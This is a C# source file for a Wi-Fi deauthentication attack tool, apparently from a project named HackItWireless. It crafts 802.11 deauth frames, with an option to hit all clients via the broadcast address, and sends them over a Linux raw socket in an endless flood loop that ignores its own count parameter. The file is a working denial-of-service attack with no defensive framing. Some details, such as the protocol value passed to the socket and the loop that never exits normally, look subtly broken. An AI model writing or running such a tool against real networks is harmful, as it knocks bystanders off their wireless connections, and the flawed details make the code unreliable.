using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace HackItWireless
{
    public sealed class DeauthEngine
    {
        private static readonly Random Rng = new();

        [DllImport("libc", SetLastError = true)]
        private static extern int socket(int domain, int type, int protocol);

        [DllImport("libc", SetLastError = true)]
        private static extern int bind(int sockfd, ref SockAddrLl addr, int addrlen);

        [DllImport("libc", SetLastError = true)]
        private static extern int send(int sockfd, byte[] buf, int len, int flags);

        [DllImport("libc", SetLastError = true)]
        private static extern int close(int fd);

        [DllImport("libc", SetLastError = true)]
        private static extern uint if_nametoindex(byte[] ifname);

        private const int AF_PACKET = 17;
        private const int SOCK_RAW = 3;
        private const int ETH_P_ALL = 0x0003;

        [StructLayout(LayoutKind.Sequential)]
        private struct SockAddrLl
        {
            public ushort sll_family;
            public ushort sll_protocol;
            public int sll_ifindex;
            public ushort sll_hatype;
            public byte sll_pkttype;
            public byte sll_halen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] sll_addr;
        }

        public byte[] BuildDeauthFrame(string bssid, string stationMac, ushort reasonCode = 7)
        {
            if (string.IsNullOrWhiteSpace(bssid))
                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
            if (string.IsNullOrWhiteSpace(stationMac))
                throw new ArgumentException("Station MAC cannot be null or empty.", nameof(stationMac));

            byte[] bssidBytes = ParseMac(bssid);
            byte[] stationBytes = ParseMac(stationMac);

            byte[] frame = new byte[26];
            int offset = 0;

            frame[offset] = 0xC0;
            offset++;

            frame[offset] = 0x00;
            offset++;

            ushort duration = 256;
            frame[offset] = (byte)(duration & 0xFF);
            frame[offset + 1] = (byte)((duration >> 8) & 0xFF);
            offset += 2;

            Array.Copy(stationBytes, 0, frame, offset, 6);
            offset += 6;

            Array.Copy(bssidBytes, 0, frame, offset, 6);
            offset += 6;

            Array.Copy(bssidBytes, 0, frame, offset, 6);
            offset += 6;

            frame[offset] = 0;
            frame[offset + 1] = 0;
            offset += 2;

            frame[offset] = (byte)(reasonCode & 0xFF);
            frame[offset + 1] = (byte)((reasonCode >> 8) & 0xFF);

            return frame;
        }

public int SendDeauthBurst(string interfaceName, string bssid, string station, int count, int reason = 7)
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        throw new PlatformNotSupportedException("Raw socket deauth requires Linux");

    byte[] frame = BuildDeauthFrame(bssid, station, (ushort)reason);
    byte[] radiotap = new byte[] { 0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00 };
    byte[] targetFrame = new byte[radiotap.Length + frame.Length];
    Buffer.BlockCopy(radiotap, 0, targetFrame, 0, radiotap.Length);
    Buffer.BlockCopy(frame, 0, targetFrame, radiotap.Length, frame.Length);

    bool targeted = station != "FF:FF:FF:FF:FF:FF";
    byte[] clientFrame = null;
    if (targeted)
    {
        byte[] cf = BuildDeauthFrame(station, bssid, (ushort)reason);
        clientFrame = new byte[radiotap.Length + cf.Length];
        Buffer.BlockCopy(radiotap, 0, clientFrame, 0, radiotap.Length);
        Buffer.BlockCopy(cf, 0, clientFrame, radiotap.Length, cf.Length);
    }

    byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(interfaceName + "\0");
    uint ifindex = if_nametoindex(ifaceBytes);
    if (ifindex == 0) return 0;

    int fd = socket(AF_PACKET, SOCK_RAW, (ETH_P_ALL << 8) | ETH_P_ALL);
    if (fd < 0) return 0;

    SockAddrLl addr = new SockAddrLl
    {
        sll_family = AF_PACKET,
        sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
        sll_ifindex = (int)ifindex,
        sll_hatype = 0,
        sll_pkttype = 0,
        sll_halen = 0,
        sll_addr = new byte[8]
    };

    int r = bind(fd, ref addr, Marshal.SizeOf(addr));
    if (r < 0) { close(fd); return 0; }

    int sent = 0;
    try
    {
        while (true)
        {
            for (int i = 0; i < 50; i++)
            {
                send(fd, targetFrame, targetFrame.Length, 0);
                sent++;
                if (targeted)
                {
                    send(fd, clientFrame, clientFrame.Length, 0);
                    sent++;
                }
            }
        }
    }
    catch { }
    finally { close(fd); }
    return sent;
}

        internal static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12)
                throw new ArgumentException($"Invalid MAC address: {mac}", nameof(mac));

            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++)
                bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);

            return bytes;
        }
    }
}
